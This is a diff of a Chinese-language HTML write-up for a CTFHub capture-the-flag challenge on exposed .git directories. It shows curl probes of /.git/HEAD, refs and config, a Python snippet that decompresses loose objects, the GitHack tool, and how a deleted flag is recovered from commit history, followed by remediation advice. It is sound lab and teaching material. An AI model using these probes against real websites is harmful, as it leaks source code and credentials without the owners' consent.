@@ -33,7 +33,7 @@
             <span class="tag"># Web</span>
             <span class="tag"># 信息泄露</span>
             <span class="tag"># Git</span>
-            <span class="tag"># loose object</span>
+            <span class="tag"># GitHack</span>
         </div>
 
         <h2>一、题目信息</h2>
@@ -41,73 +41,91 @@
             <li><strong>题目名称：</strong>Git泄露</li>
             <li><strong>题目方向：</strong>Web - 信息泄露</li>
             <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
-            <li><strong>题目提示：</strong>网站使用 Git 进行版本控制；如果部署配置不当，线上的 <code>.git</code> 目录可能被直接公开。</li>
-            <li><strong>题目目标：</strong>获取泄露的 Git 对象，恢复源码并定位 flag。</li>
+            <li><strong>题目提示：</strong>开发人员使用 Git 对站点进行版本控制；如果部署配置不当，线上的 <code>.git</code> 目录可能被直接公开。</li>
+            <li><strong>题目目标：</strong>通过泄露的 Git 仓库恢复源码和历史提交，定位被删除或隐藏的 Flag。</li>
         </ul>
 
         <h2>二、漏洞原理</h2>
-        <p>Git 仓库中的 <code>.git</code> 目录保存引用、配置、提交历史和对象数据库。如果发布网站时直接部署整个项目目录，且 Web 服务器没有拦截点开头的隐藏目录，攻击者就能访问 <code>/.git/HEAD</code>、<code>/.git/refs/</code> 和 <code>/.git/objects/</code>。</p>
-        <p>Git 的 loose object 以 zlib 压缩形式存放在 <code>.git/objects/&lt;前2位&gt;/&lt;后38位&gt;</code>。从 <code>HEAD</code> 开始依次解析 commit、tree 和 blob，即可恢复仓库文件。即使敏感文件已从最新版本删除，也可能保留在历史对象中。</p>
+        <p>使用 Git 管理的 Web 项目，其仓库根目录下会存在 <code>.git</code> 目录。该目录保存对象数据库、引用、配置和提交历史。如果部署时直接将整个项目目录复制到 Web 根目录，且服务器没有拦截以点开头的目录，攻击者就可能访问 <code>/.git/</code> 下的文件。</p>
+        <p>Git 对象通常以 loose object 形式保存在 <code>.git/objects/ab/cdef...</code> 中。得到对象后可以还原提交、目录树和文件内容。更关键的是，即使 flag 已从当前版本删除，它仍可能保留在历史提交对象中。</p>
 
-        <h2>三、探测泄露</h2>
-        <p>访问首页和 <code>/.git/HEAD</code>：</p>
-        <pre>curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/"
-curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/HEAD"</pre>
-        <p><code>HEAD</code> 返回了有效引用，说明仓库目录可被公开访问：</p>
-        <pre>HTTP/1.1 200 OK
-Content-Type: application/octet-stream
-
-ref: refs/heads/master</pre>
-
-        <h2>四、读取提交与引用</h2>
-        <p>读取 <code>master</code> 引用和提交日志：</p>
-        <pre>curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/refs/heads/master"
-curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/logs/HEAD"</pre>
-        <p>本轮环境中，<code>master</code> 指向的最新提交为：</p>
-        <pre>d09b828f50d28343cbafa211d380fdcbf310e3bf</pre>
-        <p>提交日志显示共有两次提交，第二次提交说明为 <code>add flag</code>：</p>
-        <pre>fe8a3729c987902bb3ea852a3cc75a5f4aa05ef0  init
-d09b828f50d28343cbafa211d380fdcbf310e3bf  add flag</pre>
-        <p>请求 Git smart HTTP 接口时返回 <code>404 Not Found</code>，因此不能直接执行 <code>git clone</code>，需要按对象哈希逐个恢复：</p>
-        <pre>curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/info/refs?service=git-upload-pack"</pre>
-
-        <h2>五、恢复 Git 对象</h2>
-        <p>下载并解压 commit 对象后，可以取得对应的 tree：</p>
-        <pre>commit d09b828f50d28343cbafa211d380fdcbf310e3bf
-tree   55e6b59cf68599f3134d2bc116ae52286f246c88
-parent fe8a3729c987902bb3ea852a3cc75a5f4aa05ef0</pre>
-        <p>继续读取 tree 对象 <code>55e6b59c...</code>，解析出三个文件：</p>
-        <pre>100644 49f04c9d7f959d70742a30b2593508210055eadb 34061640727815.txt
-100644 9071e0a24f654c88aa97a2273ca595e301b7ada5 50x.html
-100644 2c59e3024e3bc350976778204928a21d9ff42d01 index.html</pre>
-        <p>随机数字命名的文本文件最可疑。下载 blob <code>49f04c9d...</code>，使用 zlib 解压，并跳过 Git 的 <code>blob 33\0</code> 头部：</p>
-        <pre>import zlib
-
-raw = open("49f04c9d7f959d70742a30b2593508210055eadb", "rb").read()
-header, payload = zlib.decompress(raw).split(b"\0", 1)
-print(payload.decode())</pre>
-        <p>文件 <code>34061640727815.txt</code> 的内容为：</p>
-        <pre>ctfhub{153e312eea594df4c4b9483e}</pre>
-
-        <div class="note">
-            若目标允许 Git dumb HTTP 或工具能够自动发现对象，也可以使用 BugScanTeam 的 GitHack。Git smart HTTP 被禁用且只暴露 loose object 时，按 commit → tree → blob 的关系手动下载是最直接的方法。
-        </div>
-
-        <h2>六、最终 Flag</h2>
-        <div class="flag-box">
-            ctfhub{153e312eea594df4c4b9483e}
-        </div>
-
-        <h2>七、修复建议</h2>
+        <h2>三、解题工具</h2>
         <ul>
-            <li>禁止 Web 服务器访问 <code>.git</code>、<code>.svn</code>、<code>.hg</code> 等版本控制目录。</li>
-            <li>部署时只发布构建产物，不要将开发仓库或完整源码目录直接暴露到 Web 根目录。</li>
-            <li>使用 Nginx 或 Apache 显式拦截以点开头的隐藏文件和敏感路径。</li>
-            <li>若密钥、密码或 flag 曾进入 Git 历史，仅删除当前文件并不安全，应立即轮换凭证并清理历史对象。</li>
+            <li>浏览器或 cURL：探测 <code>.git</code> 暴露情况。</li>
+            <li>GitHack：自动化恢复常见 Git 源码泄露。</li>
+            <li>Python：在没有 Git smart HTTP 的情况下，按对象哈希递归下载并解压 loose object。</li>
+            <li>Git：查看提交历史、目录树和不同版本之间的差异。</li>
         </ul>
 
-        <h2>八、解题总结</h2>
-        <p>本题的关键是确认 <code>.git</code> 泄露后，从 <code>refs/heads/master</code> 定位最新 commit，再解析 commit、tree 和 blob。即使服务端禁用了 <code>git clone</code> 所需的 smart HTTP，只要 loose object 可下载，就能完整恢复仓库内容并取得 flag。</p>
+        <h2>四、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>确认 .git 泄露：</strong>访问 <code>/.git/HEAD</code>，服务器返回 <code>200 OK</code>，内容指向 <code>refs/heads/master</code>：
+                <pre>curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/HEAD"
+
+HTTP/1.1 200 OK
+ref: refs/heads/master</pre>
+            </li>
+            <li>
+                <strong>读取仓库配置和 HEAD 提交：</strong>继续访问配置文件和 master 引用：
+                <pre>curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/config"
+curl.exe "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/refs/heads/master"</pre>
+                本次环境的 master 提交为：
+                <pre>b3b0922230123bfb58b470cb0cc32b3a4824ce32</pre>
+            </li>
+            <li>
+                <strong>判断恢复方式：</strong>请求 Git smart HTTP 的引用接口时返回 <code>404 Not Found</code>：
+                <pre>curl.exe -i "http://challenge-xxx.sandbox.ctfhub.com:10800/.git/info/refs?service=git-upload-pack"</pre>
+                因此无法直接使用 <code>git clone</code>。可以尝试使用 BugScanTeam 的 GitHack：
+                <pre>git clone https://github.com/BugScanTeam/GitHack.git
+python GitHack.py http://challenge-xxx.sandbox.ctfhub.com:10800/.git/</pre>
+                当服务端只暴露 loose object 时，也可以按提交、目录树、文件对象的引用关系手动递归下载。
+            </li>
+            <li>
+                <strong>手动恢复 Git 对象：</strong>Git loose object 使用 zlib 压缩，原始内容格式为 <code>类型 长度\0内容</code>。根据对象的 SHA-1，可以从以下路径获取：
+                <pre>/.git/objects/&lt;前2位&gt;/&lt;后38位&gt;</pre>
+                Python 解压对象的核心逻辑如下：
+                <pre>raw = urllib.request.urlopen(object_url).read()
+body = zlib.decompress(raw)
+header, payload = body.split(b"\x00", 1)
+# header: b"commit 179", b"tree 42", b"blob 33", ...</pre>
+                恢复时从 <code>HEAD</code> 指向的 commit 开始，读取其中的 <code>tree</code>；解析 tree 条目后继续递归获取子 tree 和 blob，最终可还原完整工作区。
+            </li>
+            <li>
+                <strong>检查历史提交：</strong>当前 HEAD 的 tree 中没有 flag。继续沿 commit 的 <code>parent</code> 字段回溯，共恢复出 3 个提交；flag 位于当前版本之前的提交中，并从最新版本删除了对应文件。
+                <pre>commit b3b0922230123bfb58b470cb0cc32b3a4824ce32
+tree   012ae1fc6b838a345b689ae6bb4ec0edfd517a64
+
+parent 4b44ae76c0d1...
+tree   687865dde222321d7b514469e7056a1851473c1b</pre>
+            </li>
+            <li>
+                <strong>读取恢复出的文件：</strong>中间版本恢复出 flag 文件 <code>21632082326844.txt</code>，内容如下：
+                <pre>cat 21632082326844.txt
+ctfhub{538c24e1183f417dc4b3684b}</pre>
+            </li>
+        </ol>
+
+        <div class="note">
+            提示：GitHack 能处理多数目录索引和 loose object 泄露场景；若目标禁用了 Git smart HTTP 且只开放单个对象文件，可参考本题的手动对象解析方式。
+        </div>
+
+        <h2>五、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{538c24e1183f417dc4b3684b}
+        </div>
+
+        <h2>六、修复建议</h2>
+        <ul>
+            <li>禁止 Web 服务器访问 <code>.git</code>、<code>.svn</code>、<code>.hg</code> 等版本控制目录。</li>
+            <li>部署流水线只发布构建产物，不要将开发仓库或完整源码目录直接暴露到 Web 根目录。</li>
+            <li>使用 Nginx 或 Apache 显式拦截以点开头的隐藏文件和敏感路径。</li>
+            <li>若密钥、密码或 flag 曾进入 Git 历史，仅删除当前文件并不安全，应立即轮换相关凭据并清理历史对象。</li>
+            <li>上线前使用目录扫描和安全检查验证 <code>/.git/HEAD</code>、<code>/.git/config</code> 等路径不可访问。</li>
+        </ul>
+
+        <h2>七、解题总结</h2>
+        <p>本题的核心是识别 <code>.git</code> 目录泄露，并从 Git 历史而非当前页面中寻找 Flag。虽然 <code>HEAD</code> 对应的最新版本已经删除 flag 文件，但历史提交仍保留了 tree 和 blob 对象，通过恢复提交链和文件对象即可获得完整 Flag。</p>
     </div>
 </body>
 </html>
